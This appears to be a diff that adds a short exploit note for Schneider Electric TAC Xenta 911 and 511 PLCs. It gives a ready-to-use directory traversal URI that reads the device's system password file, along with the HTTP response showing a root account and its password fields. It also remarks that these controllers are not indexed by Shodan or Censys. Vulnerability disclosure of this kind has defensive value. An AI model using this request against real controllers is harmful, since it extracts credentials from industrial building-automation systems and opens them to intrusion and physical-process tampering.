@@ -1,0 +1,23 @@
+# Schneider Electric TAC Xenta 911 and 511 PLCs
+
+Directory traversal in help manuals allows for credentials extraction
+
+Devices are not indexed by crawlers like Shodan or Censys due to ancient SSL configuration,
+needed to use old browser to support it (not even s_client, curl or ncat could connect).
+
+
+URI: /www/help/public/../../../sys/pswd
+
+vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv
+
+HTTP/1.0 200 OK
+
+root
+super user
+/
+/
+/
+password
+0
+900
+3
